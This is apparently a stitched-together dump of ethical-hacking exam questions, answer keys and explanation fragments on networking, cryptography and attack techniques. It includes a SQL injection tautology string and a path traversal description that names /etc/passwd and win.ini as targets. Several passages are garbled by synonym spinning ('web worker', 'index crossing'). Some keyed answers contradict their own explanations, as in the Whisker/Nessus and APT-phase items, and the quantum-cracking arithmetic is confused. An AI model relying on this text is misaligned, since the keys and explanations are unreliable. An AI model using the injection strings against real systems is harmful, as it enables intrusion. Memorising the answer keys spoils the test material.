There are four types of risk mitigation strategies that hold unique to Business Continuity and Disaster Recovery. When mitigating risk, it’ s important to develop a strategy that closely relates to and matches your company’s profile. A picture containing diagram Description automatically generated Risk Acceptance Risk acceptance does not reduce any effects; however, it is still considered a strategy. This strategy is a common option when the cost of other risk management options such as avoidance or limitation may outweigh the cost of the risk itself. A company that doesn’t want to spend a lot of money on avoiding risks that do not have a high possibility of occurring will use the risk acceptance strategy. Risk Avoidance Risk avoidance is the opposite of risk acceptance. It is the action that avoids any exposure to the risk whatsoever. It’s important to note that risk avoidance is usually the most expensive of all risk mitigation options. Risk Limitation Risk limitation is the most common risk management strategy used by businesses. This strategy limits a company’s exposure by taking some action. It is a strategy employing a bit of risk acceptance and a bit of risk avoidance or an average of both. An example of risk limitation would be a company accepting that a disk drive may fail and avoiding a long period of failure by having backups. Risk Transference Risk transference is the involvement of handing risk off to a willing third party. For example, numerous companies outsource certain operations such as customer service, payroll services, etc. This can be beneficial for a company if a transferred risk is not a core competency of that company. It can also be used so a company can focus more on its core competencies."}

{"id": 30, "topic": 1, "question": "Session splicing is an IDS evasion technique in which an attacker delivers data in multiple, small sized packets to the target computer, making it very difficult for an IDS to detect the attack signatures. Which tool can be used to perform session splicing attacks?", "options": {"A": "tcpsplice", "B": "Burp", "C": "Hydra", "D": "Whisker"}, "answer": ["D"], "explanation": "«Many IDS reassemble communication streams; hence, if a packet is not received within a reasonable period, many IDS stop reassembling and handling that stream. If the application under attack keeps a session active for a longer time than that spent by the IDS on reassembling it, the IDS will stop. As a result, any session after the IDS stops reassembling the sessions will be susceptible to malicious data theft by attackers. The IDS will not log any attack attempt after a successful splicing attack. Attackers can use tools such as Nessus for session splicing attacks.» Did you know that the EC-Council exam shows how well you know their official book? So, there is no \"Whisker\" in it. In the chapter \"Evading IDS\" -> \"Session Splicing\", the recommended tool for performing a session-splicing attack is Nessus. Where Wisker came from is not entirely clear, but I will assume the author of the question found it while copying Wikipedia. https://en.wikipedia.org/wiki/Intrusion_detection_system_evasion_techniques One basic technique is to split the attack payload into multiple small packets so that the IDS must reassemble the packet stream to detect the attack. A simple way of splitting packets is by fragmenting them, but an adversary can also simply craft packets with small payloads. The 'whisker' evasion tool calls crafting packets with small payloads 'session splicing'. By itself, small packets will not evade any IDS that reassembles packet streams. However, small packets can be further modified in order to complicate reassembly and detection. One evasion technique is to pause between sending parts of the attack, hoping that the IDS will time out before the target computer does. A second evasion technique is to send the packets out of order, confusing simple packet re-assemblers but not the target computer. NOTE: Yes, I found scraps of information about the tool that existed in 2012, but I can not give you unverified information. According to the official tutorials, the correct answer is Nessus, but if you know anything about Wisker, please write in the QA section. Maybe this question will be updated soon, but I'm not sure about that."}

{"id": 45, "topic": 1, "question": "During a black-box pen test you attempt to pass IRC traffic over port 80/TCP from a compromised web enabled host. The traffic gets blocked; however, outbound HTTP traffic is unimpeded. What type of firewall is inspecting outbound traffic?", "options": {"A": "Circuit", "B": "Stateful", "C": "Application", "D": "Packet Filtering"}, "answer": ["C"], "explanation": "https://en.wikipedia.org/wiki/Internet_Relay_Chat Internet Relay Chat (IRC) is an application layer protocol that facilitates communication in text. The chat process works on a client/server networking model. IRC clients are computer programs that users can install on their system or web-based applications running either locally in the browser or on a third-party server. These clients communicate with chat servers to transfer messages to other clients. IRC is a plaintext protocol that is officially assigned port 194, according to IANA. However, running the service on this port requires running it with root-level permissions, which is inadvisable. As a result, the well- known port for IRC is 6667, a high-number port that does not require elevated privileges. However, an IRC server can also be configured to run on other ports as well. You can't tell if an IRC server is designed to be malicious solely based on port number. Still, if you see an IRC server running on port a WKP such as 80, 8080, 53, 443, it's almost always going to be malicious; the only real reason for IRCD to be running on port 80 is to try to evade firewalls. https://en.wikipedia.org/wiki/Application_firewall An application firewall is a form of firewall that controls input/output or system calls of an application or service. It operates by monitoring and blocking communications based on a configured policy, generally with predefined rule sets to choose from. The application firewall can control communications up to the OSI model's application layer, which is the highest operating layer, and where it gets its name. The two primary categories of application firewalls are network-based and host-based. Application layer filtering operates at a higher level than traditional security appliances. This allows packet decisions to be made based on more than just source/destination IP Addresses or ports. It can also use information spanning across multiple connections for any given host. Network-based application firewalls Network-based application firewalls operate at the application layer of a TCP/IP stack. They can understand certain applications and protocols such as File Transfer Protocol (FTP), Domain Name System (DNS), or Hypertext Transfer Protocol (HTTP). This allows it to identify unwanted applications or services using a non- standard port or detect if an allowed protocol is being abused. F. Host-based application firewalls A host-based application firewall monitors application system calls or other general system communication. This gives more granularity and control but is limited to only protecting the host it is running on. Control is applied by filtering on a per-process basis. Generally, prompts are used to define rules for processes that have not yet received a connection. Further filtering can be done by examining the process ID of the owner of the data packets. Many host-based application firewalls are combined or used in conjunction with a packet filter."}

Private network addresses are not allocated to any specific organization. Anyone may use these addresses without approval from regional or local Internet registries. Private IP address spaces were originally defined to assist in delaying IPv4 address exhaustion. IP packets originating from or addressed to a private IP address cannot be routed through the public Internet. The Internet Engineering Task Force (IETF) has directed the Internet Assigned Numbers Authority (IANA) to reserve the following IPv4 address ranges for private networks: · 10.0.0.0 – 10.255.255.255 · 172.16.0.0 – 172.31.255.255 · 192.168.0.0 – 192.168.255.255 Backbone routers do not allow packets from or to internal IP addresses.

Each address is assigned a 48-bit address, which is used to determine whether we can access a network or not. It helps in listing a set of allowed devices that you need on your Wi-Fi and the list of denied devices that you don’t want on your Wi-Fi. It helps in preventing unwanted access to the network. In a way, we can blacklist or white list certain computers based on their MAC address. We can configure the filter to allow connection only to those devices included in the white list. White lists provide greater security than blacklists because the router grants access only to selected devices. It is used on enterprise wireless networks having multiple access points to prevent clients from communicating with each other. The access point can be configured only to allow clients to talk to the default gateway, but not other wireless clients. It increases the efficiency of access to a network. The router allows configuring a list of allowed MAC addresses in its web interface, allowing you to choose which devices can connect to your network. The router has several functions designed to improve the network's security, but not all are useful. Media access control may seem advantageous, but there are certain flaws. On a wireless network, the device with the proper credentials such as SSID and password can authenticate with the router and join the network, which gets an IP address and access to the internet and any shared resources.

DNS stands for “Domain Name System.” It’s a system that lets you connect to websites by matching human- readable domain names (like example.com) with the server's unique ID where a website is stored. Think of the DNS system as the internet’s phonebook. It lists domain names with their corresponding identifiers called IP addresses, instead of listing people’s names with their phone numbers. When a user enters a domain name like wpbeginner.com on their device, it looks up the IP address and connects them to the physical location where that website is stored. NOTE: Often DNS lookup information will be cached locally inside the querying computer or remotely in the DNS infrastructure. There are typically 8 steps in a DNS lookup. When DNS information is cached, steps are skipped from the DNS lookup process, making it quicker. The example below outlines all 8 steps when nothing is cached. The 8 steps in a DNS lookup: 1. A user types ‘example.com’ into a web browser, and the query travels into the Internet and is received by a DNS recursive resolver; 2. The resolver then queries a DNS root nameserver; 3. The root server then responds to the resolver with the address of a Top-Level Domain (TLD) DNS server (such as .com or .net), which stores the information for its domains. When searching for example.com, our request is pointed toward the .com TLD; 4. The resolver then requests the .com TLD; 5. The TLD server then responds with the IP address of the domain’s nameserver, example.com; 6. Lastly, the recursive resolver sends a query to the domain’s nameserver; 7. The IP address for example.com is then returned to the resolver from the nameserver; 8. The DNS resolver then responds to the web browser with the IP address of the domain requested initially; Once the 8 steps of the DNS lookup have returned the IP address for example.com, the browser can request the web page: 9. The browser makes an HTTP request to the IP address; 10. The server at that IP returns the webpage to be rendered in the browser. NOTE 2: DNS primarily uses the User Datagram Protocol (UDP) on port number 53 to serve requests. And if this port is blocked, then a problem arises already in the first step. But the ninth step is performed without problems."}

Joseph uses his laptop computer regularly to administer the Web site. One night, Joseph received an urgent phone call from his friend, Smith. According to Smith, the main Mason Insurance web site had been vandalized! All of its normal content was removed and replaced with an attacker's message ''Hacker Message: You are dead! Freaks!” From his office, which was directly connected to Mason Insurance's internal network, Joseph surfed to the Web site using his laptop. In his browser, the Web site looked completely intact. No changes were apparent. Joseph called a friend of his at his home to help troubleshoot the problem. The Web site appeared defaced when his friend visited using his DSL connection. So, while Smith and his friend could see the defaced page, Joseph saw the intact Mason Insurance web site. To help make sense of this problem, Joseph decided to access the Web site using hisdial-up ISP. He disconnected his laptop from the corporate internal network and used his modem to dial up the same ISP used by Smith. After his modem connected, he quickly typed www.masonins.com in his browser to reveal the following web page: After seeing the defaced Web site, he disconnected his dial-up line, reconnected to the internal network, and used Secure Shell (SSH) to log in directly to the Web server.

Instead, secure protocols such as HTTPS, Secure File Transfer Protocol (SFTP), and Secure Shell (SSH) should be preferred. In case there is a necessity for using any insecure protocol in any application, all the data transmission should be encrypted. If required, VPN (Virtual Private Networks) can be used to provide secure access to users. NOTE: I want to note that the wording \"best option\" is valid only for the EC-Council's exam since the other options will not help against sniffing or will only help from some specific attack vectors. The sniffing attack surface is huge. To protect against it, you will need to implement a complex of measures at all levels of abstraction and apply controls at the physical, administrative, and technical levels.

The recipient is then tricked into clicking a malicious link, which can lead to the installation of malware, the freezing of the system as part of a ransomware attack, or the revealing of sensitive information. An attack can have devastating results. For individuals, this includes unauthorized purchases, the stealing of funds, or identify theft. Moreover, phishing is often used to gain a foothold in corporate or governmental networks as a part of a larger attack, such as an advanced persistent threat (APT) event. In this latter scenario, employees are compromised in order to bypass security perimeters, distribute malware inside a closed environment, or gain privileged access to secured data. An organization succumbing to such an attack typically sustains severe financial losses in addition to declining market share, reputation, and consumer trust.

After a root bridge is elected, the topology is established from its perspective of the connectivity. The switches determine the path to the root bridge, and all redundant paths are blocked. STP sends configuration and topology change notifications and acknowledgments (TCN/TCA) using bridge protocol data units (BPDU). An STP attack involves an attacker spoofing the root bridge in the topology. The attacker broadcasts out an STP configuration/topology change BPDU in an attempt to force an STP recalculation. The BPDU sent out announces that the attacker’s system has a lower bridge priority. The attacker can then see a variety of frames forwarded from other switches to it. STP recalculation may also cause a denial-of-service (DoS) condition on the network by causing an interruption of 30 to 45 seconds each time the root bridge changes. An attacker using STP network topology changes to force its host to be elected as the root bridge. switch"}

The salt value needs to be hold on by the site, which means typically sites use the same salt for each parole. This makes it less effective than if individual salts are used. The use of unique salts means that common passwords shared by multiple users – like “123456” or “password” – aren’t revealed revealed when one such hashed password is known – because despite the passwords being the same the immediately and hashed values are not.

Index crossing or Path Traversal is a HTTP assault which permits aggressors to get to limited catalogs and execute orders outside of the web worker’s root registry. Web workers give two primary degrees of security instruments Access Control Lists (ACLs) Root index An Access Control List is utilized in the approval cycle. It is a rundown which the web worker’s manager uses to show which clients or gatherings can get to, change or execute specific records on the worker, just as other access rights. The root registry is a particular index on the worker record framework in which the clients are kept. Clients can’t get to anything over this root. For instance: the default root registry of IIS on Windows is C:\\Inetpub\\wwwroot and with this arrangement, a client doesn’t approach C:\\Windows yet approaches C:\\Inetpub\\wwwroot\\news and some other indexes and documents under the root catalog (given that the client is confirmed by means of the ACLs). The root index keeps clients from getting to any documents on the worker, for example, C:\\WINDOWS /system32/win.ini on Windows stages and the/and so on/passwd record on Linux/UNIX stages. This weakness can exist either in the web worker programming itself or in the web application code. To play out a registry crossing assault, all an assailant requires is an internet browser and some information on where to aimlessly discover any default documents and registries on the framework. What an assailant can do if your site is defenselessWith a framework defenseless against index crossing, an aggressor can utilize this weakness to venture out of the root catalog and access different pieces of the record framework. This may enable the assailant to see confined documents, which could give the aggressor more data needed to additional trade off the framework. Contingent upon how the site access is set up, the aggressor will execute orders by mimicking himself as the client which is related with “the site”. Along these lines everything relies upon what the site client has been offered admittance to in the framework. Illustration of a Directory Traversal assault by means of web application codeIn web applications with dynamic pages, input is generally gotten from programs through GET or POST solicitation techniques. Here is an illustration of a HTTP GET demand URL GET http://test.webarticles.com/show.asp?view=oldarchive.html HTTP/1.1 Host: test.webarticles.com With this URL, the browser requests the dynamic page show.asp from the server and with it also sends the parameter view with the value of oldarchive.html. When this request is executed on the web server, show. asp retrieves the file oldarchive.html from the server’s file system, renders it and then sends it back to the browser which displays it to the user.

It allows you to send real-time data from one application to another whenever a given event happens. For example, let’s say you’ve created an application using the Foursquare API that tracks when people check into your restaurant. You ideally wish to be able to greet customers by name and provide a complimentary drink when they check in. What a webhook will is notify you any time someone checks in, therefore you’d be able to run any processes that you simply had in your application once this event is triggered. The data is then sent over the web from the application wherever the event originally occurred, to the receiving application that handles the data. Here’s a visual representation of what that looks like: A webhook url is provided by the receiving application, and acts as a phone number that the other application will call once an event happens. Only it’s more complicated than a phone number, because data about the event is shipped to the webhook url in either JSON or XML format. this is known as the “payload.” Here’s an example of what a webhook url looks like with the payload it’s carrying: What are Webhooks? Webhooks are user-defined HTTP callback or push APIs that are raised based on events triggered, such as comment received on a post and pushing code to the registry. A webhook allows an application to update other applications with the latest information. Once invoked, it supplies data to the other applications, which means that users instantly receive real-time information. Webhooks are sometimes called “Reverse APIs” as they provide what is required for API specification, and the developer should create an API to use a webhook. A webhook is an API concept that is also used to send text messages and notifications to mobile numbers or email addresses from an application when a specific event is triggered. For instance, if you search for something in the online store and the required item is out of stock, you click on the “Notify me” bar to get an alert from the application when that item is available for purchase.

CVSS consists of three metric groups: Base, Temporal, and Environmental. The Base metrics produce a score ranging from 0 to 10, which can then be modified by scoring the Temporal and Environmental metrics. A CVSS score is also represented as a vector string, a compressed textual representation of the values used to derive the score. Thus, CVSS is well suited as a standard measurement system for industries, organizations, and governments that need accurate and consistent vulnerability severity scores. Two common uses of CVSS are calculating the severity of vulnerabilities discovered on one's systems and as a factor in prioritization of vulnerability remediation activities.

Effective security requires keeping the private key private; the public key can be openly distributed without compromising security. In such a system, any person can encrypt a message using the intended receiver's public key, but that encrypted message can only be decrypted with the receiver's private key. This allows, for instance, a server program to generate a cryptographic key intended for a suitable symmetric-key cryptography, then to use a client's openly-shared public key to encrypt that newly generated symmetric key. The server can then send this encrypted symmetric key over an insecure channel to the client; only the client can decrypt it using the client's private key (which pairs with the public key used by the server to encrypt the message). With the client and server both having the same symmetric key, they can safely use symmetric key encryption (likely much faster) to communicate over otherwise-insecure channels. This scheme has the advantage of not having to manually pre-share symmetric keys (a fundamentally difficult problem) while gaining the higher data throughput advantage of symmetric-key cryptography. With public-key cryptography, robust authentication is also possible. A sender can combine a message with a private key to create a short digital signature on the message. Anyone with the sender's corresponding public key can combine that message with a claimed digital signature; if the signature matches the message, the origin of the message is verified (i.e., it must have been made by the owner of the corresponding private key). Public key algorithms are fundamental security primitives in modern cryptosystems, including applications and protocols which offer assurance of the confidentiality, authenticity and non-repudiability of electronic communications and data storage. They underpin numerous Internet standards, such as Transport Layer Security (TLS), S/MIME, PGP, and GPG. Some public key algorithms provide key distribution and secrecy (e. g., Diffie–Hellman key exchange), some provide digital signatures (e.g., Digital Signature Algorithm), and some provide both (e.g., RSA). Compared to symmetric encryption, asymmetric encryption is rather slower than good symmetric encryption, too slow for many purposes. Today's cryptosystems (such as TLS, Secure Shell) use both symmetric encryption and asymmetric encryption."}

Once the data is encrypted, the session key is then encrypted to the recipient's public key https://en.wikipedia.org/wiki/Pretty_Good_Privacy Pretty Good Privacy (PGP) is an encryption program that provides cryptographic privacy and authentication for data communication. PGP is used for signing, encrypting, and decrypting texts, e-mails, files, directories, and whole disk partitions and to increase the security of e-mail communications. PGP encryption uses a serial combination of hashing, data compression, symmetric-key cryptography, and finally public-key cryptography; each step uses one of several supported algorithms. Each public key is bound to a username or an e-mail address. https://en.wikipedia.org/wiki/Public-key_cryptography Public key encryption uses two different keys. One key is used to encrypt the information and the other is used to decrypt the information. Sometimes this is referred to as asymmetric encryption because two keys are required to make the system and/or process work securely. One key is known as the public key and should be shared by the owner with anyone who will be securely communicating with the key owner. However, the owner’s secret key is not to be shared and considered a private key. If the private key is shared with unauthorized recipients, the encryption mechanisms protecting the information must be considered compromised."}

Here, we will also create use of the vulnerability in sure dbms whereby a user provided field isn’t strongly used in or isn’t checked for sort constraints. This could take place once a numeric field is to be employed in a SQL statement; but, the programmer makes no checks to validate that the user supplied input is numeric. Variation is an evasion technique whereby the attacker can easily evade any comparison statement. The attacker does this by placing characters such as “' or '1'='1'” in any basic injection statement such as “or 1=1” or with other accepted SQL comments. Evasion Technique: Variation Variation is an evasion technique whereby the attacker can easily evade any comparison statement. The attacker does this by placing characters such as “' or '1'='1'” in any basic injection statement such as “or 1=1” or with other accepted SQL comments. The SQL interprets this as a comparison between two strings or characters instead of two numeric values. As the evaluation of two strings yields a true statement, similarly, the evaluation of two numeric values yields a true statement, thus rendering the evaluation of the complete query unaffected. It is also possible to write many other signatures; thus, there are infinite possibilities of variation as well. The main aim of the attacker is to have a WHERE statement that is always evaluated as “true” so that any mathematical or string comparison can be used, where the SQL can perform the same."}

Which of the following host discovery techniques must he use to perform the given task?", "options": {"A": "UDP scan", "B": "TCP Maimon scan", "C": "arp ping scan", "D": "ACK flag probe scan"}, "answer": ["C"], "explanation": "One of the most common Nmap usage scenarios is scanning an Ethernet LAN. Most LANs, especially those that use the private address range granted by RFC 1918, do not always use the overwhelming majority of IP addresses. When Nmap attempts to send a raw IP packet, such as an ICMP echo request, the OS must determine a destination hardware (ARP) address, such as the target IP, so that the Ethernet frame can be properly addressed. .. This is required to issue a series of ARP requests. This is best illustrated by an example where a ping scan is attempted against an Area Ethernet host. The –send-ip option tells Nmap to send IP-level packets (rather than raw Ethernet), even on area networks. The Wireshark output of the three ARP requests and their timing have been pasted into the session. Raw IP ping scan example for offline targetsThis example took quite a couple of seconds to finish because the (Linux) OS sent three ARP requests at 1 second intervals before abandoning the host. Waiting for a few seconds is excessive, as long as the ARP response usually arrives within a few milliseconds. Reducing this timeout period is not a priority for OS vendors, as the overwhelming majority of packets are sent to the host that actually exists. Nmap, on the other hand, needs to send packets to 16 million IP s given a target like 10.0.0.0/8. Many targets are pinged in parallel, but waiting 2 seconds each is very delayed. There is another problem with raw IP ping scans on the LAN. If the destination host turns out to be unresponsive, as in the previous example, the source host usually adds an incomplete entry for that destination IP to the kernel ARP table. ARP tablespaces are finite and some operating systems become unresponsive when full. If Nmap is used in rawIP mode (–send-ip), Nmap may have to wait a few minutes for the ARP cache entry to expire before continuing host discovery. ARP scans solve both problems by giving Nmap the highest priority. Nmap issues raw ARP requests and handles retransmissions and timeout periods in its sole discretion. The system ARP cache is bypassed. The example shows the difference. This ARP scan takes just over a tenth of the time it takes for an equivalent IP. Example b ARP ping scan of offline target In example b, neither the -PR option nor the -send-eth option has any effect. This is often because ARP has a default scan type on the Area Ethernet network when scanning Ethernet hosts that Nmap discovers. This includes traditional wired Ethernet as 802.11 wireless networks. As mentioned above, ARP scanning is not only more efficient, but also more accurate. Hosts frequently block IP-based ping packets, but usually cannot block ARP requests or responses and communicate over the network.Nmap uses ARP instead of all targets on equivalent targets, even if different ping types (such as -PE and -PS) are specified.

It’s a symmetric key block cipher with a block size of 128 bits, with keys up to 256 bits. it’s associated with AES (Advanced Encryption Standard) and an earlier block cipher called Blowfish. Twofish was actually a finalist to become the industry standard for encryption, but was ultimately beaten out by the present AES.Twofish has some distinctive features that set it aside from most other cryptographic protocols. For one, it uses pre-computed, key-dependent S-boxes. An S- box (substitution-box) may be a basic component of any symmetric key algorithm which performs substitution. within the context of Twofish’s block cipher, the S-box works to obscure the connection of the key to the ciphertext. Twofish uses a pre-computed, key-dependent S-box which suggests that the S-box is already provided, but depends on the cipher key to decrypt the knowledge . How Secure is Twofish?Twofish is seen as a really secure option as far as encryption protocols go. one among the explanations that it wasn’t selected because the advanced encryption standard is thanks to its slower speed. Any encryption standard that uses a 128-bit or higher key, is theoretically safe from brute force attacks. Twofish is during this category.Because Twofish uses “pre-computed key-dependent S-boxes”, it are often susceptible to side channel attacks. this is often thanks to the tables being pre-computed. However, making these tables key-dependent helps mitigate that risk. There are a couple of attacks on Twofish, but consistent with its creator, Bruce Schneier, it didn’t constitute a real cryptanalysis. These attacks didn’t constitue a practical break within the cipher.

SSID broadcast is how your router transmits this name to surrounding devices. Its primary function is to make your network visible and easily accessible. Most routers broadcast their SSIDs automatically. To disable or enable SSID broadcast, you need to change your router’s settings. Disabling SSID broadcast will make your Wi-FI network name invisible to other users. However, this only hides the name, not the network itself. You cannot disguise the router's activity, so hackers can still attack it. With your network invisible to wireless devices, connecting becomes a bit more complicated. Just giving a Wi-FI password to your guests is no longer enough. They have to configure their settings manually by including the network name, security mode, and other relevant info. Disabling SSID might be a small step towards online security, but by no means should it be your final one. Before considering it as a security measure, consider the following aspects: - Disabling SSID broadcast will not hide your network completely Disabling SSID broadcast only hides the network name, not the fact that it exists. Your router constantly transmits so-called beacon frames to announce the presence of a wireless network. They contain essential information about the network and help the device connect. - Third-party software can easily trace a hidden network Programs such as NetStumbler or Kismet can easily locate hidden networks. You can try using them yourself to see how easy it is to find available networks – hidden or not. - You might attract unwanted attention. Disabling your SSID broadcast could also raise suspicion.

They can be quite confusing and complicated to set up the first time you go through the process, but when you understand what is going on, everything should make more sense. SNMP has gone through several revisions to improve performance and security (version 1, 2c and 3). By default, it is a UDP port based protocol where communication is based on a ‘fire and forget’ methodology in which network packets are sent to another device, but there is no check for receipt of that packet (versus TCP port when a network packet must be acknowledged by the other end of the communication link). There are two modes of operation with SNMP – get requests (or polling) where one device requests information from an SNMP enabled device on a regular basis (normally using UDP port 161), and traps where the SNMP enabled device sends a message to another device when an event occurs (normally using UDP port 162). The latter includes instances such as someone logging on, the device powering up or down, or a wide variety of other problems that would need this type of investigation. This blog covers SNMPv3 traps, as polling and version 2c traps are covered elsewhere in our documentation. SNMP trapsSince SNMP is primarily a UDP port based system, traps may be ‘lost’ when sending between devices; the sending device does not wait to see if the receiver got the trap. This means if the configuration on the sending device is wrong (using the wrong receiver IP address or port) or the receiver isn’t listening for traps or rejecting them out of hand due to misconfiguration, the sender will never know. The SNMP v2c specification introduced the idea of splitting traps into two types; the original ‘hope it gets there’ trap and the newer ‘INFORM’ traps. Upon receipt of an INFORM, the receiver must send an acknowledgement back. If the sender doesn’t get the acknowledgement back, then it knows there is an existing problem and can log it for sysadmins to find when they interrogate the device."}

Using these techniques, he successfully deployed malware on the target system to establish an outbound connection. What is the APT lifecycle phase that Harry is currently executing?", "options": {"A": "Preparation", "B": "Cleanup", "C": "Persistence", "D": "initial intrusion"}, "answer": ["A"], "explanation": "After the attacker completes preparations, subsequent step is an effort to realize an edge within the target’s environment. a particularly common entry tactic is that the use of spearphishing emails containing an internet link or attachment. Email links usually cause sites where the target’s browser and related software are subjected to varied exploit techniques or where the APT actors plan to social engineer information from the victim which will be used later. If a successful exploit takes place, it installs an initial malware payload on the victim’s computer. Figure 2 illustrates an example of a spearphishing email that contains an attachment. Attachments are usually executable malware, a zipper or other archive containing malware, or a malicious Office or Adobe PDF (Portable Document Format) document that exploits vulnerabilities within the victim’s applications to ultimately execute malware on the victim’s computer. Once the user has opened a malicious file using vulnerable software, malware is executing on the target system. These phishing emails are often very convincing and difficult to differentiate from legitimate email messages. Tactics to extend their believability include modifying legitimate documents from or associated with the organization. Documents are sometimes stolen from the organization or their collaborators during previous exploitation operations. Actors modify the documents by adding exploits and malicious code then send them to the victims. Phishing emails are commonly sent through previously compromised email servers, email accounts at organizations associated with the target or public email services. Emails also can be sent through mail relays with modified email headers to form the messages appear to possess originated from legitimate sources. Exploitation of vulnerabilities on public-facing servers is another favorite technique of some APT groups.

{"id": 4, "topic": 3, "question": "You are the lead cybersecurity analyst at a multinational corporation that uses a hybrid encryption system to secure inter-departmental communications. The system uses RSA encryption for key exchange and AES for data encryption, taking advantage of the strengths of both asymmetric and symmetric encryption. Each RSA key pair has a size of 'n' bits, with larger keys providing more security at the cost of slower performance. The time complexity of generating an RSA key pair is O(n*2), and AES encryption has a time complexity of O(n). An attacker has developed a quantum algorithm with time complexity O((log n)*2) to crack RSA encryption. Given n=4000 and variable 'AES key size', which scenario would provide the best balance of security and performance?", "options": {"A": "Data encryption with 3DES using a 168-bit key: Offers high security but slower performance due to 3DES's inherent inefficiencies.", "B": "Data encryption with Blowfish using a 448-bit key: Offers high security but potential compatibility issues due to Blowfish's less widespread use.", "C": "Data encryption with AES-128: Provides moderate security and fast encryption, offering a balance between the two.", "D": "Data encryption with AES-256: Provides high security with better performance than 3DES, but not as fast as AES-128."}, "answer": ["C"], "explanation": "Data encryption with AES-128 is likely to provide the best balance of security and performance in this scenario. This option works as follows: AES-128 is a symmetric encryption algorithm that uses a 128-bit key to encrypt and decrypt data. AES- 128 is one of the most widely used and trusted encryption algorithms, and it is considered secure against classical and quantum attacks, as long as the key is not compromised. AES-128 has a time complexity of O(n), which means that the encryption and decryption time is proportional to the size of the data. AES-128 is also fast and efficient, as it can process 16 bytes of data in each round, and it requires only 10 rounds to complete the encryption or decryption12. RSA-4000 is an asymmetric encryption algorithm that uses a 4000-bit key pair to encrypt and decrypt data. RSA-4000 is used for key exchange, which means that it is used to securely share the AES-128 key between the sender and the receiver. RSA-4000 has a time complexity of O(n*2), which means that the key generation, encryption, and decryption time is proportional to the square of the size of the key. RSA-4000 is also slow and resource-intensive, as it involves large number arithmetic and modular exponentiation operations. RSA-4000 is considered secure against classical attacks, but it is vulnerable to quantum attacks, especially if the attacker has access to a quantum computer with sufficient resources to run Shor’s algorithm, which can factor large numbers in polynomial time34. The attacker’s quantum algorithm has a time complexity of O((log n)*2), which means that the cracking time is proportional to the square of the logarithm of the size of the key. This implies that the attacker can crack RSA-4000 much faster than a classical computer, as the logarithm function grows much slower than the linear or quadratic function. For example, if a classical computer takes 10^12 years to crack RSA-4000, a quantum computer with the attacker’s algorithm could do it in about 10^4 years, which is still a long time, but not impossible5. Therefore, data encryption with AES-128 is likely to provide the best balance of security and performance in this scenario, because: AES-128 is secure and fast, and it can encrypt large amounts of data efficiently. RSA-4000 is slow and vulnerable, but it is only used for key exchange, which involves a small amount of data and a one-time operation. The attacker’s quantum algorithm is powerful, but it is not practical, as it requires a quantum computer with a large number of qubits and a long coherence time, which are not available yet. The other options are not as balanced as option C for the following reasons: A. Data encryption with 3DES using a 168-bit key: This option offers high security but slower performance due to 3DES’s inherent inefficiencies. 3DES is a symmetric encryption algorithm that uses a 168-bit key to encrypt and decrypt data. 3DES is a variant of DES, which is an older and weaker encryption algorithm that us..."}

This option works as follows: The Cyber Kill Chain Methodology is a framework that describes the stages of a cyberattack from the perspective of the attacker. It helps defenders to understand the attacker’s objectives, tactics, and techniques, and to design effective countermeasures. The Cyber Kill Chain Methodology consists of seven stages: reconnaissance, weaponization, delivery, exploitation, installation, command and control, and actions on objectives12. The delivery stage is the third stage in the Cyber Kill Chain Methodology, and it involves sending or transmitting the weaponized payload to the target system. The delivery stage can use various methods, such as email attachments, web links, removable media, or network protocols. The delivery stage aims to reach the target system and bypass any security controls, such as firewalls, antivirus, or email filters12. The exploitation stage is the fourth stage in the Cyber Kill Chain Methodology, and it involves executing the malicious payload on the target system. The exploitation stage can use various techniques, such as buffer overflows, code injection, or privilege escalation. The exploitation stage aims to exploit a vulnerability or a weakness in the target system and gain access to its resources, such as files, processes, or memory12. The installation stage is the fifth stage in the Cyber Kill Chain Methodology, and it involves installing a backdoor or a malware on the target system. The installation stage can use various tools, such as rootkits, trojans, or ransomware. The installation stage aims to establish a foothold on the target system and maintain persistence, which means to survive reboots, updates, or scans12. Therefore, the most probable subsequent action from the attacker based on the Cyber Kill Chain Methodology is to exploit the malicious payload delivered to the target organization and establish a foothold, because: This action follows the logical sequence of the Cyber Kill Chain Methodology, as it is the next stage after the delivery stage. This action is consistent with the attacker’s goal, as it allows the attacker to gain access and control over the target system and prepare for further actions. This action is feasible, as the attacker has already delivered the malicious payload to the target system and may have bypassed some security controls. The other options are not as probable as option B for the following reasons: A. The attacker will attempt to escalate privileges to gain complete control of the compromised system: This option is possible, but not the most probable, because it is not the next stage in the Cyber Kill Chain Methodology, but rather a technique that can be used in the exploitation stage or the installation stage.

{"id": 7, "topic": 3, "question": "You are an ethical hacker contracted to conduct a security audit for a company. During the audit, you discover that the company's wireless network is using WEP encryption. You understand the vulnerabilities associated with WEP and plan to recommend a more secure encryption method. Which of the following would you recommend as a Suitable replacement to enhance the security of the company's wireless network?", "options": {"A": "MAC address filtering", "B": "WPA2-PSK with AES encryption", "C": "Open System authentication", "D": "SSID broadcast disabling"}, "answer": ["B"], "explanation": "WEP encryption is an outdated and insecure method of protecting wireless networks from unauthorized access and eavesdropping. WEP uses a static key that can be easily cracked by various tools and techniques, such as capturing the initialization vectors, brute-forcing the key, or exploiting the weak key scheduling algorithm1. Therefore, you should recommend a more secure encryption method to enhance the security of the company’s wireless network. One of the most suitable replacements for WEP encryption is WPA2-PSK with AES encryption. WPA2 stands for Wi-Fi Protected Access 2, which is a security standard that improves upon the previous WPA standard. WPA2 uses a robust encryption algorithm called AES, which stands for Advanced Encryption Standard. AES is a block cipher that uses a 128-bit key and is considered to be very secure and resistant to attacks2. WPA2-PSK stands for WPA2 Pre-Shared Key, which is a mode of WPA2 that uses a passphrase or a password to generate the encryption key. The passphrase or password must be entered by the users who want to connect to the wireless network. The key is then derived from the passphrase or password using a function called PBKDF2, which stands for Password-Based Key Derivation Function 2. PBKDF2 adds a salt and a number of iterations to the passphrase or password to make it harder to crack3. WPA2-PSK with AES encryption offers several advantages over WEP encryption, such as: It uses a dynamic key that changes with each session, instead of a static key that remains the same. It uses a stronger encryption algorithm that is more difficult to break, instead of a weaker encryption algorithm that is more vulnerable to attacks. It uses a longer key that provides more security, instead of a shorter key that provides less security. It uses a more secure key derivation function that adds complexity and randomness, instead of a simple key generation function that is predictable and flawed. Therefore, you should recommend WPA2-PSK with AES encryption as a suitable replacement to enhance the security of the company’s wireless network.

